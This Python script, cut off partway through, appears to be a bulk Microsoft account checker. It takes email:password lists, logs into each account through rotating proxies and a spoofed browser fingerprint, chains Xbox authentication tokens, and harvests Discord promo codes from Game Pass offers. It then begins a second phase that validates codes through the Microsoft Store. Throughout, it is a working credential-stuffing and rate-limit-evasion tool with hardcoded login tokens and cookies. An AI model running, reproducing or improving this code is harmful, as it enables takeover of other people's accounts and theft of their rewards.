from curl_cffi import requests
from colorama import Fore, Style, init
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import ctypes
import json
import time
import random
import os
import queue
import asyncio
import urllib.parse
import uuid
import re
import sys
from datetime import datetime
# import tkinter as tk
# from tkinter import filedialog
from collections import defaultdict, deque

init(autoreset=True)

# Define all offer IDs
OFFER_IDS = [
    "A3525E6D4370403B9763BCFA97D383D9",
    "84704E5A4CA149158DF0EE5A98667A6C", 
    "6E121925C999458EA54F9431B2AE0F61",
    "0FEE36ED7C3745FE96E380A21B29F40B",
    "4796FB32C18946AEA373CD9D05F9CED9",
    "35D1403FBECA468AB8F87401A0F5AB0A",
    "7DB89F8A54CD4D66AE50DCE4A5A07CB8",
    "BF48C0DC5D3247528FB1B3128048DEB9",
    "F3772BE0689A4B2DA7FDA70CBFE72AA5",
    "B8A36A8AA3DE41108C9CC74536769AAE",
    "71A176083A8747E4BE62B2C4A3163A66",
    "45ABFBEED2494EA6B3797EFB9BB63962",
    "A127BE0771214949B22BEEBD3FFF7349"
]

# Special offer ID for promo codes
PROMO_OFFER_ID = "A3525E6D4370403B9763BCFA97D383D9"
PROMO_PREFIX = "promos.discord.gg/"
PROMO_CODE_LENGTH = "9VnP4KADwp7KusfeZJpRHfDX"

# Phase 1 variables
print_lock = threading.Lock()
checked_accounts = 0
codes_found = 0
total_accounts = 0
stats_lock = threading.Lock()
save_lock = threading.Lock()
fetched_codes = []
promo_codes = []  # Special storage for promo codes

# Phase 2 variables
results_count = {'VALID': 0, 'VALID_REQUIRES_CARD': 0, 'REGION_LOCKED': 0, 'INVALID': 0, 'UNKNOWN': 0}
processed_codes = set()
processed_codes_lock = threading.Lock()

# Network request settings
MAX_THREADS_FETCHER = 40  # Reduced to avoid rate limiting
MAX_THREADS_VALIDATOR = 40  # Reduced to avoid rate limiting
REQUEST_TIMEOUT = 15
MAX_RETRIES = 3

# Proxy management variables
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.proxy_enabled = False  # Flag to check if proxies are available
        self.proxy_stats = {}
        self.proxy_rotation_index = 0
        self.lock = threading.Lock()
        self.proxy_failures = defaultdict(int)
        self.max_failures = 3
        self.session_proxy_map = {}
        self.proxy_queue = deque()
        
    def load_proxies(self, filename="proxies.txt"):
        """Load proxies from file - optional"""
        try:
            if not os.path.exists(filename):
                print_colored(f"[ i ] No proxy file found. Running without proxies.", Fore.YELLOW)
                self.proxy_enabled = False
                return
            
            with open(filename, "r") as f:
                lines = [line.strip() for line in f if line.strip()]
            
            if not lines:
                print_colored(f"[ i ] Proxy file is empty. Running without proxies.", Fore.YELLOW)
                self.proxy_enabled = False
                return
            
            for line in lines:
                proxy = self.parse_proxy_line(line)
                if proxy:
                    self.proxies.append(proxy)
                    self.proxy_stats[proxy['raw']] = {
                        'success': 0,
                        'failures': 0,
                        'response_time': 0,
                        'last_used': 0,
                        'is_working': True
                    }
                    self.proxy_queue.append(proxy['raw'])
            
            if self.proxies:
                print_colored(f"[ + ] Loaded {len(self.proxies)} proxies", Fore.GREEN)
                print_colored(f"[ i ] Testing proxies...", Fore.YELLOW)
                self.test_all_proxies()
                
                if self.working_proxies:
                    self.proxy_enabled = True
                    print_colored(f"[ ✓ ] Proxy system enabled with {len(self.working_proxies)} working proxies", Fore.GREEN)
                else:
                    self.proxy_enabled = False
                    print_colored(f"[ ! ] No working proxies found. Running without proxies.", Fore.YELLOW)
            else:
                self.proxy_enabled = False
                print_colored(f"[ i ] No valid proxies found. Running without proxies.", Fore.YELLOW)
                
        except Exception as e:
            print_colored(f"[ - ] Error loading proxies: {str(e)}", Fore.RED)
            print_colored(f"[ i ] Running without proxies.", Fore.YELLOW)
            self.proxy_enabled = False
    
    def parse_proxy_line(self, line):
        """Parse proxy line in various formats"""
        try:
            line = line.strip()
            
            proxy_data = {'raw': line, 'type': 'socks4', 'host': '', 'port': 0, 'username': None, 'password': None}
            
            if line.startswith('socks4://'):
                line = line[9:]  # Remove 'socks4://'
            elif line.startswith('socks5://'):
                line = line[9:]  # Remove 'socks5://'
                proxy_data['type'] = 'socks5'
            elif line.startswith('http://'):
                line = line[7:]  # Remove 'http://'
                proxy_data['type'] = 'http'
            elif line.startswith('https://'):
                line = line[8:]  # Remove 'https://'
                proxy_data['type'] = 'http'  # curl_cffi uses http for both
            
            # Check for authentication
            if '@' in line:
                auth, hostport = line.split('@', 1)
                if ':' in auth:
                    proxy_data['username'], proxy_data['password'] = auth.split(':', 1)
                else:
                    proxy_data['username'] = auth
            else:
                hostport = line
            
            # Extract host and port
            if ':' in hostport:
                host, port = hostport.split(':', 1)
                proxy_data['host'] = host
                proxy_data['port'] = int(port)
            else:
                return None
            
            return proxy_data
            
        except Exception:
            return None
    
    def test_proxy(self, proxy_data):
        """Test if a proxy is working"""
        try:
            session = requests.Session(impersonate="chrome")
            
            proxy_url = self.format_proxy_url(proxy_data)
            session.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }
            
            start_time = time.time()
            # Test with a quick request
            response = session.get("https://httpbin.org/ip", timeout=10)
            response_time = time.time() - start_time
            
            if response.status_code == 200:
                with self.lock:
                    self.proxy_stats[proxy_data['raw']]['response_time'] = response_time
                    self.proxy_stats[proxy_data['raw']]['is_working'] = True
                    if proxy_data['raw'] not in self.working_proxies:
                        self.working_proxies.append(proxy_data['raw'])
                
                print_colored(f"[ ✓ ] Proxy {proxy_data['host']}:{proxy_data['port']} working ({response_time:.2f}s)", Fore.GREEN)
                return True
            else:
                print_colored(f"[ ✗ ] Proxy {proxy_data['host']}:{proxy_data['port']} failed (HTTP {response.status_code})", Fore.RED)
                return False
                
        except Exception:
            print_colored(f"[ ✗ ] Proxy {proxy_data['host']}:{proxy_data['port']} failed", Fore.RED)
            return False
    
    def test_all_proxies(self):
        """Test all loaded proxies"""
        print_colored(f"[ i ] Testing {len(self.proxies)} proxies...", Fore.YELLOW)
        
        test_threads = min(5, len(self.proxies))
        with ThreadPoolExecutor(max_workers=test_threads) as executor:
            futures = []
            for proxy_data in self.proxies:
                future = executor.submit(self.test_proxy, proxy_data)
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
    
    def get_proxy(self, session_id=None):
        """Get the next proxy in rotation - returns None if no proxies"""
        if not self.proxy_enabled or not self.working_proxies:
            return None
        
        with self.lock:
            # If session already has a proxy, return it
            if session_id and session_id in self.session_proxy_map:
                proxy_raw = self.session_proxy_map[session_id]
                if proxy_raw in self.working_proxies:
                    return self.get_proxy_data(proxy_raw)
            
            # Get next proxy from queue
            for _ in range(len(self.proxy_queue)):
                proxy_raw = self.proxy_queue.popleft()
                self.proxy_queue.append(proxy_raw)
                
                if proxy_raw in self.working_proxies:
                    self.proxy_stats[proxy_raw]['last_used'] = time.time()
                    
                    if session_id:
                        self.session_proxy_map[session_id] = proxy_raw
                    
                    return self.get_proxy_data(proxy_raw)
            
            # Fallback to any working proxy
            if self.working_proxies:
                proxy_raw = random.choice(self.working_proxies)
                if session_id:
                    self.session_proxy_map[session_id] = proxy_raw
                return self.get_proxy_data(proxy_raw)
            
            return None
    
    def get_proxy_data(self, proxy_raw):
        """Get proxy data from raw string"""
        for proxy in self.proxies:
            if proxy['raw'] == proxy_raw:
                return proxy
        return None
    
    def format_proxy_url(self, proxy_data):
        """Format proxy data into URL"""
        if proxy_data['username'] and proxy_data['password']:
            return f"{proxy_data['type']}://{proxy_data['username']}:{proxy_data['password']}@{proxy_data['host']}:{proxy_data['port']}"
        else:
            return f"{proxy_data['type']}://{proxy_data['host']}:{proxy_data['port']}"
    
    def record_success(self, proxy_raw):
        """Record successful proxy usage"""
        if not self.proxy_enabled or not proxy_raw:
            return
            
        with self.lock:
            if proxy_raw in self.proxy_stats:
                self.proxy_stats[proxy_raw]['success'] += 1
                self.proxy_stats[proxy_raw]['failures'] = 0
                self.proxy_failures[proxy_raw] = 0
    
    def record_failure(self, proxy_raw, reason=""):
        """Record proxy failure"""
        if not self.proxy_enabled or not proxy_raw:
            return
            
        with self.lock:
            if proxy_raw in self.proxy_stats:
                self.proxy_stats[proxy_raw]['failures'] += 1
                self.proxy_failures[proxy_raw] += 1
                
                if self.proxy_failures[proxy_raw] >= self.max_failures:
                    if proxy_raw in self.working_proxies:
                        self.working_proxies.remove(proxy_raw)
                        self.proxy_stats[proxy_raw]['is_working'] = False
                        print_colored(f"[ ✗ ] Proxy removed: {proxy_raw} - {reason}", Fore.RED)
                        
                        # Remove from session mappings
                        sessions_to_remove = []
                        for sid, mapped_proxy in self.session_proxy_map.items():
                            if mapped_proxy == proxy_raw:
                                sessions_to_remove.append(sid)
                        
                        for sid in sessions_to_remove:
                            del self.session_proxy_map[sid]
    
    def cleanup_session(self, session_id):
        """Clean up session proxy mapping"""
        with self.lock:
            if session_id in self.session_proxy_map:
                del self.session_proxy_map[session_id]
    
    def get_stats(self):
        """Get proxy statistics"""
        if not self.proxy_enabled:
            return "Proxies: Disabled"
        
        with self.lock:
            total = len(self.proxies)
            working = len(self.working_proxies)
            
            stats_str = f"Proxies: {working}/{total} working"
            
            if working > 0:
                # Add info for top proxy
                working_proxy_stats = []
                for proxy_raw in self.working_proxies:
                    stat = self.proxy_stats.get(proxy_raw, {})
                    working_proxy_stats.append((proxy_raw, stat.get('success', 0)))
                
                if working_proxy_stats:
                    working_proxy_stats.sort(key=lambda x: x[1], reverse=True)
                    if working_proxy_stats:
                        proxy_data = self.get_proxy_data(working_proxy_stats[0][0])
                        if proxy_data:
                            stats_str += f" | Best: {proxy_data['host']}:{proxy_data['port']}"
            
            return stats_str

# Initialize proxy manager
proxy_manager = ProxyManager()

# Circuit breaker for endpoints
class CircuitBreaker:
    def __init__(self, failure_threshold=3, reset_timeout=300):
        self.failure_threshold = failure_threshold
        self.reset_timeout = reset_timeout
        self.failures = defaultdict(int)
        self.opened_at = defaultdict(float)
        self.endpoint_lock = threading.Lock()
    
    def can_make_request(self, endpoint):
        """Check if we can make a request to endpoint"""
        with self.endpoint_lock:
            if endpoint in self.opened_at:
                time_since_open = time.time() - self.opened_at[endpoint]
                if time_since_open < self.reset_timeout:
                    return False
                else:
                    del self.opened_at[endpoint]
                    self.failures[endpoint] = 0
            
            return True
    
    def record_failure(self, endpoint):
        """Record a failure for endpoint"""
        with self.endpoint_lock:
            self.failures[endpoint] += 1
            
            if self.failures[endpoint] >= self.failure_threshold:
                self.opened_at[endpoint] = time.time()
    
    def record_success(self, endpoint):
        """Record success for endpoint"""
        with self.endpoint_lock:
            if self.failures[endpoint] > 0:
                self.failures[endpoint] = 0
            
            if endpoint in self.opened_at:
                del self.opened_at[endpoint]

circuit_breaker = CircuitBreaker(failure_threshold=3, reset_timeout=300)

def exponential_backoff(retry_count, base_delay=3, max_delay=300):
    """Exponential backoff with jitter"""
    delay = min(base_delay * (2 ** retry_count), max_delay)
    jitter = random.uniform(0, delay * 0.3)
    return delay + jitter

def create_session(impersonate="chrome", session_id=None):
    """Create a session with or without proxy"""
    session = requests.Session(impersonate=impersonate)
    
    # Get a proxy if available
    proxy_data = proxy_manager.get_proxy(session_id)
    
    if proxy_data:
        proxy_url = proxy_manager.format_proxy_url(proxy_data)
        session.proxies = {
            "http": proxy_url,
            "https": proxy_url
        }
        
        # Store session ID for proxy tracking
        if session_id:
            session.session_id = session_id
            session.proxy_raw = proxy_data['raw']
        else:
            session.session_id = str(uuid.uuid4())
            session.proxy_raw = proxy_data['raw']
    else:
        # No proxy available
        session.session_id = str(uuid.uuid4())
        session.proxy_raw = None
    
    session.timeout = REQUEST_TIMEOUT
    return session

def update_titlebar_phase1(callback=None):
    global checked_accounts, codes_found, total_accounts
    with stats_lock:
        checked = checked_accounts
        found = codes_found
        total = total_accounts
    
    proxy_stats = proxy_manager.get_stats()
    title = f"Phase 1: Accounts: {checked}/{total} | Codes: {found} | {proxy_stats}"
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    except:
        pass
    if callback:
        callback(title)

def update_titlebar_phase2(processed_count, total_codes, callback=None):
    valid_count = results_count.get('VALID', 0)
    validpi_count = results_count.get('VALID_REQUIRES_CARD', 0)
    region_locked_count = results_count.get('REGION_LOCKED', 0)
    invalid_count = results_count.get('INVALID', 0)
    
    proxy_stats = proxy_manager.get_stats()
    title = f"Phase 2: Codes: {processed_count}/{total_codes} | V:{valid_count} | VP:{validpi_count} | RL:{region_locked_count} | I:{invalid_count} | {proxy_stats}"
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    except:
        pass
    if callback:
        callback(title)

def print_colored(message, color):
    with print_lock:
        print(f"{color}{message}{Style.RESET_ALL}")

def select_accounts_file():
    """Open file dialog to select accounts file"""
    return None

def read_accounts():
    """Read accounts from selected file"""
    file_path = select_accounts_file()
    if not file_path:
        print(f"{Fore.RED}No file selected. Exiting.{Fore.RESET}")
        return []
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            accounts = []
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    try:
                        email, password = line.split(':', 1)
                        accounts.append((email.strip(), password.strip()))
                    except:
                        continue
            print(f"{Fore.GREEN}✓ Loaded {len(accounts)} accounts from {file_path}{Fore.RESET}")
            return accounts
    except Exception as e:
        print(f"{Fore.RED}✗ Error reading accounts file: {str(e)}{Fore.RESET}")
        return []

# ==================== PHASE 1: CODE FETCHING ====================
def check_account_for_codes(email, password):
    """Check a single account for codes from ALL offer IDs"""
    global checked_accounts, codes_found, fetched_codes, promo_codes
    
    session = None
    retry_count = 0
    login_success = False
    current_proxy_raw = None
    
    # Generate session ID for proxy tracking
    session_id = f"fetch_{email}_{int(time.time())}"
    
    # Add random initial delay
    time.sleep(random.uniform(0.5, 2.0))
    
    while retry_count <= MAX_RETRIES:
        try:
            # Check circuit breaker
            if not circuit_breaker.can_make_request("login.live.com"):
                time.sleep(30)
                continue
            
            # Create session (with or without proxy)
            session = create_session("chrome", session_id)
            current_proxy_raw = session.proxy_raw
            
            # Add delay for retries
            if retry_count > 0:
                delay = exponential_backoff(retry_count)
                time.sleep(delay)
            
            # Step 1: Get Microsoft token
            try:
                tokenreq = session.post(
                    "https://login.live.com/ppsecure/post.srf?client_id=00000000402B5328&contextid=BDC5114DCDD66170&opid=24F67D97F397B4D4&bk=1766143321&uaid=b63537c0c7504c9994c9bb225f8b15b1&pid=15216&prompt=none",
                    data={
                        "login": email,
                        "loginfmt": email,
                        "passwd": password,
                        "PPFT": "-DtA1pAkl0XJHNRkli!yvhp27QUgO13pUa3ZWnDBoHwyy!k9wWNwRWEyQYe!VK9zJcqrm8WWg7JoT30qyiKuxfftM*Nu6dE*e2km5kZLsSJhMmVmWWPE1KERSnnEcSLmF7fINHZ8RCZiQuA7svzQrpZ!cT0EXEdgCMzKKtGxHdEr2ASIuVp18K!PVtqs!!VJ2BHaCCoZmkDbbdM93QVJFUEqlZs5Irk1FrfHBmkOwc!oljXDF7s4yd0QLH6F8!OApew$$"
                    },
                    headers={
                        "cookie": "MSPRequ=id=N&lt=1766143321&co=0; uaid=b63537c0c7504c9994c9bb225f8b15b1; OParams=11O.Dmr1Vzmgxhnw*DZMBommGzglE!XAx**dZAAEAkqrj6Vhfs1*d8zayvuFT4v8h**f4Zznq9nRUcLS9f73g52XDgo7Kbzaj6iKcOC5jd*0H*P0vHhUeQjflLTYuHZ5HjCH91cYf2IwyylYf1h*C0T0EAXHejOrafOi5c0OR9bDhZmwlD0LAij0Nh!LTG99GmPovt95zHocHGurn3MldqO7Wiu5sxHh72H0Lyq7fpM6jzizp7AunI36mEHFzldPpwHIiRIKpTu*ZLNOMdGWqc0eSTB8YMzPtg8dceV4x5n9Tg2EUB2Ys3Dy2Y0BTAddNnvHH4XHvg!FnkKhATiMub2jf8aakcAvExkfKMMWQuvAsS8shz0nD*eOvpilbh273y!r43VDwk5BEaKKmnZwjWFnKpWfx2wi1x3vfEtiU!EVKaGG; MSPOK=$uuid-643bb80a-c886-4f04-af49-4ab7b44ddc78$uuid-ee3b24c9-f289-4f10-aff1-7ff79eb97c11"
                    },
                    allow_redirects=False,
                    timeout=REQUEST_TIMEOUT
                )
                
                if tokenreq.status_code == 429:
                    circuit_breaker.record_failure("login.live.com")
                    if current_proxy_raw:
                        proxy_manager.record_failure(current_proxy_raw, "HTTP 429")
                    retry_count += 1
                    time.sleep(5)
                    continue
                
                if tokenreq.status_code != 302:
                    retry_count += 1
                    continue
                
                location = tokenreq.headers.get("Location", "")
                if "token=" not in location:
                    retry_count += 1
                    continue
                
                token = location.split("token=")[1].split("&")[0]
                if token == "None":
                    retry_count += 1
                    continue
                
                circuit_breaker.record_success("login.live.com")
                if current_proxy_raw:
                    proxy_manager.record_success(current_proxy_raw)
                    
            except Exception as e:
                circuit_breaker.record_failure("login.live.com")
                if current_proxy_raw:
                    proxy_manager.record_failure(current_proxy_raw, str(e))
                retry_count += 1
                continue

            # Step 2: Get Xbox token
            try:
                if not circuit_breaker.can_make_request("user.auth.xboxlive.com"):
                    time.sleep(30)
                    retry_count += 1
                    continue
                
                xbox_login = session.post(
                    'https://user.auth.xboxlive.com/user/authenticate',
                    json={
                        "Properties": {
                            "AuthMethod": "RPS",
                            "SiteName": "user.auth.xboxlive.com",
                            "RpsTicket": token
                        },
                        "RelyingParty": "http://auth.xboxlive.com",
                        "TokenType": "JWT"
                    },
                    headers={
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    timeout=REQUEST_TIMEOUT
                )
                
                if xbox_login.status_code == 429:
                    circuit_breaker.record_failure("user.auth.xboxlive.com")
                    if current_proxy_raw:
                        proxy_manager.record_failure(current_proxy_raw, "HTTP 429")
                    retry_count += 1
                    time.sleep(5)
                    continue
                
                if xbox_login.status_code != 200:
                    retry_count += 1
                    continue
                
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if not xbox_token:
                    retry_count += 1
                    continue
                
                uhs = js['DisplayClaims']['xui'][0]['uhs']
                
                circuit_breaker.record_success("user.auth.xboxlive.com")
                if current_proxy_raw:
                    proxy_manager.record_success(current_proxy_raw)
                
            except Exception as e:
                circuit_breaker.record_failure("user.auth.xboxlive.com")
                if current_proxy_raw:
                    proxy_manager.record_failure(current_proxy_raw, str(e))
                retry_count += 1
                continue

            # Step 3: Get XSTS token
            try:
                if not circuit_breaker.can_make_request("xsts.auth.xboxlive.com"):
                    time.sleep(30)
                    retry_count += 1
                    continue
                
                xsts = session.post(
                    'https://xsts.auth.xboxlive.com/xsts/authorize',
                    json={
                        "Properties": {
                            "SandboxId": "RETAIL",
                            "UserTokens": [xbox_token]
                        },
                        "RelyingParty": "http://xboxlive.com",
                        "TokenType": "JWT"
                    },
                    headers={
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    timeout=REQUEST_TIMEOUT
                )
                
                if xsts.status_code == 429:
                    circuit_breaker.record_failure("xsts.auth.xboxlive.com")
                    if current_proxy_raw:
                        proxy_manager.record_failure(current_proxy_raw, "HTTP 429")
                    retry_count += 1
                    time.sleep(5)
                    continue
                
                if xsts.status_code != 200:
                    retry_count += 1
                    continue
                
                js = xsts.json()
                xsts_token = js.get("Token")
                if not xsts_token:
                    retry_count += 1
                    continue
                
                authtoken = f"XBL3.0 x={uhs};{xsts_token}"
                
                circuit_breaker.record_success("xsts.auth.xboxlive.com")
                if current_proxy_raw:
                    proxy_manager.record_success(current_proxy_raw)
                
            except Exception as e:
                circuit_breaker.record_failure("xsts.auth.xboxlive.com")
                if current_proxy_raw:
                    proxy_manager.record_failure(current_proxy_raw, str(e))
                retry_count += 1
                continue

            # Login successful
            login_success = True
            print_colored(f"[ + ] LOGIN SUCCESS = {email}", Fore.GREEN)
            
            # Step 4: Check ALL 13 offer IDs for codes
            account_codes_found = 0
            codes_from_account = []
            promo_code_found = False
            
            for i, offer_id in enumerate(OFFER_IDS):
                # Add delay between offer checks
                if i > 0:
                    time.sleep(random.uniform(0.3, 1.0))
                
                offer_retry = 0
                while offer_retry <= 1:
                    try:
                        if not circuit_breaker.can_make_request("profile.gamepass.com"):
                            time.sleep(30)
                            break
                        
                        r = session.post(
                            f"https://profile.gamepass.com/v2/offers/{offer_id}",
                            headers={"authorization": authtoken},
                            timeout=REQUEST_TIMEOUT
                        )
                        
                        if r.status_code == 429:
                            circuit_breaker.record_failure("profile.gamepass.com")
                            if current_proxy_raw:
                                proxy_manager.record_failure(current_proxy_raw, "HTTP 429")
                            offer_retry += 1
                            time.sleep(5)
                            continue
                        
                        if r.status_code == 200:
                            try:
                                data = r.json()
                                code_resource = data.get("resource")
                                if code_resource and ("discord.gift" in code_resource or len(code_resource) >= 16):
                                    # Extract code
                                    if "/" in code_resource:
                                        code = code_resource.split("/")[-1]
                                    else:
                                        code = code_resource
                                    
                                    if code not in codes_from_account:
                                        codes_from_account.append(code)
                                        account_codes_found += 1
                                        
                                        # Check if this is from the special promo offer ID
                                        if offer_id == PROMO_OFFER_ID and code == PROMO_CODE_LENGTH:
                                            promo_code_found = True
                                            print_colored(f"[ ★ ] PROMO CODE FOUND = {email} | {PROMO_PREFIX}{code}", Fore.MAGENTA)
                                        
                                circuit_breaker.record_success("profile.gamepass.com")
                                if current_proxy_raw:
                                    proxy_manager.record_success(current_proxy_raw)
                            except json.JSONDecodeError:
                                pass
                            break
                        elif r.status_code == 403:
                            break
                        else:
                            offer_retry += 1
                            continue
                            
                    except Exception as e:
                        circuit_breaker.record_failure("profile.gamepass.com")
                        if current_proxy_raw:
                            proxy_manager.record_failure(current_proxy_raw, str(e))
                        offer_retry += 1
                        if offer_retry > 1:
                            break
                        continue
            
            # Save all codes found from this account
            if codes_from_account:
                with save_lock:
                    for code in codes_from_account:
                        if code not in fetched_codes:
                            fetched_codes.append(code)
                            codes_found += 1
                            
                            # Save to fetched_codes.txt
                            with open("fetched_codes.txt", "a", encoding='utf-8') as f:
                                f.write(f"{code}\n")
                            
                            # If this is a promo code, save to promos.txt
                            if promo_code_found and code == PROMO_CODE_LENGTH:
                                promo_codes.append(code)
                                with open("promos.txt", "a", encoding='utf-8') as f:
                                    f.write(f"{PROMO_PREFIX}{code}\n")
                
                # Show success message
                msg = f"[ + ] CODE FOUND = {email} | Found {account_codes_found} code(s)"
                if promo_code_found:
                    msg += f" | PROMO: {PROMO_PREFIX}{PROMO_CODE_LENGTH}"
                print_colored(msg, Fore.CYAN)
            else:
                print_colored(f"[ - ] NO CODE FOUND = {email}", Fore.YELLOW)
            
            # Add cooldown after successful account check
            time.sleep(random.uniform(1.0, 3.0))
            
            return True
            
        except Exception as e:
            print_colored(f"[ ! ] Exception for {email}: {str(e)}", Fore.YELLOW)
            if current_proxy_raw:
                proxy_manager.record_failure(current_proxy_raw, str(e))
            retry_count += 1
            if retry_count > MAX_RETRIES:
                break
            continue
        finally:
            if session:
                try:
                    session.close()
                except:
                    pass
                finally:
                    # Clean up session proxy mapping
                    if hasattr(session, 'session_id'):
                        proxy_manager.cleanup_session(session.session_id)
    
    # If we reach here, login failed or all retries exhausted
    if not login_success:
        print_colored(f"[ - ] LOGIN FAILED = {email}", Fore.RED)
    
    # Add longer cooldown after failure
    time.sleep(random.uniform(3.0, 6.0))
    
    return False

def phase1_fetch_codes(accounts, callback=None):
    """Phase 1: Fetch codes from all accounts"""
    global checked_accounts, total_accounts, fetched_codes, codes_found, promo_codes
    
    with stats_lock:
        total_accounts = len(accounts)
    
    # Clear previous data
    fetched_codes = []
    promo_codes = []
    codes_found = 0
    checked_accounts = 0
    
    # Clear output files
    if os.path.exists("fetched_codes.txt"):
        os.remove("fetched_codes.txt")
    if os.path.exists("promos.txt"):
        os.remove("promos.txt")
    
    print(f"{Fore.CYAN}Starting to check {len(accounts)} accounts for codes...{Fore.RESET}")
    print(f"{Fore.YELLOW}Configuration:{Fore.RESET}")
    print(f"{Fore.YELLOW}• Threads: {MAX_THREADS_FETCHER}{Fore.RESET}")
    print(f"{Fore.YELLOW}• Timeout: {REQUEST_TIMEOUT}s per request{Fore.RESET}")
    print(f"{Fore.YELLOW}• Max Retries: {MAX_RETRIES}{Fore.RESET}")
    print(f"{Fore.YELLOW}• Circuit breaker enabled{Fore.RESET}")
    print(f"{Fore.YELLOW}• Checking ALL {len(OFFER_IDS)} offer IDs per account{Fore.RESET}")
    print(f"{Fore.YELLOW}• Proxies: {proxy_manager.get_stats()}{Fore.RESET}")
    print(f"{Fore.MAGENTA}• Special Offer ID: {PROMO_OFFER_ID} will be saved to promos.txt{Fore.RESET}")
    print(f"{Fore.MAGENTA}• Promo format: {PROMO_PREFIX}{PROMO_CODE_LENGTH}{Fore.RESET}")
    print()
    
    update_titlebar_phase1(callback)
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS_FETCHER) as executor:
        futures = []
        for email, password in accounts:
            future = executor.submit(check_account_for_codes, email, password)
            futures.append(future)
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass
            finally:
                with stats_lock:
                    checked_accounts += 1
                update_titlebar_phase1(callback)
    
    # Print summary
    print(f"\n{Fore.GREEN}✓ Phase 1 completed!{Fore.RESET}")
    print(f"{Fore.CYAN}Total accounts checked: {checked_accounts}{Fore.RESET}")
    print(f"{Fore.CYAN}Total codes found: {codes_found}{Fore.RESET}")
    if promo_codes:
        print(f"{Fore.MAGENTA}Promo codes found: {len(promo_codes)} (saved to promos.txt){Fore.RESET}")
        with open("promos.txt", 'r') as f:
            for line in f:
                print(f"{Fore.MAGENTA}  {line.strip()}{Fore.RESET}")

# ==================== PHASE 2: CODE VALIDATION ====================
def generate_reference_id():
    """Generate Microsoft reference ID"""
    timestamp_val = int(time.time() // 30)
    n = f'{timestamp_val:08X}'
    o = (uuid.uuid4().hex + uuid.uuid4().hex).upper()
    result_chars = []
    for e in range(64):
        if e % 8 == 1:
            result_chars.append(n[(e - 1) // 8])
        else:
            result_chars.append(o[e])
    return "".join(result_chars)

def login_microsoft_for_validation(email, password):
    """Login to Microsoft account for validation"""
    retry_count = 0
    session_id = f"validate_{email}_{int(time.time())}"
    
    while retry_count <= MAX_RETRIES:
        try:
            if not circuit_breaker.can_make_request("login.live.com_validation"):
                time.sleep(30)
                retry_count += 1
                continue
            
            session = create_session("chrome", session_id)
            current_proxy_raw = session.proxy_raw
            
            if retry_count > 0:
                delay = exponential_backoff(retry_count)
                time.sleep(delay)
            
            login_response = session.post(
                "https://login.live.com/ppsecure/post.srf?username=%7bemail%7d&client_id=0000000048170EF2&contextid=072929F9A0DD49A4&opid=D34F9880C21AE341&bk=1765024327&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216&prompt=none",
                data={
                    'login': email,
                    'loginfmt': email, 
                    'passwd': password,
                    'PPFT': "-Drzud3DzKKJtVD9IfM5xwJywwEjJp5zvvJmrSyu*RKOf!PbgSCQ7ReuKFS*sIpTV5r28epGtqBhqH3JYvND4!onwSWz2JEkvdeewUQC6HmAXRgjYBzSlf0mjEYbx3ULc7oy5fUK3LDSb*CnkAG03FLzwVPmT5WjYu4sE5Wqd93pCx0USJK4jelAWNvsMog0Rmj90tmeCd*1pDYjkINyPEgQSkv6y5GPuX!GmYwKccALUt*!SRaI02p*XUqePtNtJzw$$"
                },
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    "Cookie": "MSPRequ=id=N&lt=1765024327&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-90ce4cdb-2718-4d7e-9889-4136cfacc5b2; OParams=11O.DhmByHnT9kscyud7VyWQt5uWQuQOYWZ9O2v5E49mKxVoKsSZaB4KnwkAQCVjghW9A6M8syem4sO!g4KOfietehdD7U2eXeVo8eUsorIQv1deGf6v43egdNizv1*agwrVh2OTg7pu2SRE3SougNTvzlNUNe1BgtO4HFlLRm6UoEW3PNBIxuVPmFBiPs0wEU162jlfO8yA1!QZV7KKArG8NPChj0kf1IOfR95k0fIfa0!fDW8Md44pKHa3rkU0Um0KB03YEBdWMOAbJlX5RONIL3M31WhD4LG3GPAoBPAMCN9fMk2rHlwix8g6MOW3HKxDT4I0TlKrYHDBJejZWSmI23T3v2kr1MKaL9vEQoaTwOJf9VloMFBi7yB!kisHZn0BkjE!HGWhaliwYdluhJUCu1g$"
                },
                timeout=REQUEST_TIMEOUT,
                allow_redirects=False
            )
            
            if login_response.status_code == 429:
                circuit_breaker.record_failure("login.live.com_validation")
                if current_proxy_raw:
                    proxy_manager.record_failure(current_proxy_raw, "HTTP 429")
                retry_count += 1
                time.sleep(5)
                continue
                
            if login_response.status_code != 302:
                retry_count += 1
                continue
                
            if "error=interaction_required" in login_response.headers.get('Location', ''):
                retry_count += 1
                continue

            try:
                location = login_response.headers['Location']
                token = urllib.parse.unquote(location.split('access_token=')[1].split('&')[0])
            except:
                retry_count += 1
                continue

            try:
                session.get("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", timeout=5)
            except:
                pass
            
            circuit_breaker.record_success("login.live.com_validation")
            if current_proxy_raw:
                proxy_manager.record_success(current_proxy_raw)
            
            session.current_proxy_raw = current_proxy_raw
            
            return session, token
            
        except Exception as e:
            circuit_breaker.record_failure("login.live.com_validation")
            if current_proxy_raw:
                proxy_manager.record_failure(current_proxy_raw, str(e))
            retry_count += 1
            if retry_count > MAX_RETRIES:
                return None, None
            continue
    
    return None, None

def get_store_cart_state(session, force_refresh=False, token=None):
    """Get store cart state for validation"""
    try:
        if not force_refresh and hasattr(session, 'store_state'):
            return session.store_state
            
        ms_cv = f"xddT7qMNbECeJpTq.6.2"
        
        url = 'https://www.microsoft.com/store/purchase/buynowui/redeemnow'
        params = {
            'ms-cv': ms_cv,
            'market': 'US',
            'locale': 'en-GB',
            'clientName': 'AccountMicrosoftCom'
        }
        
        payload = {
            'data': '{"usePurchaseSdk":true}',
            'market': 'US',
            'cV': ms_cv,
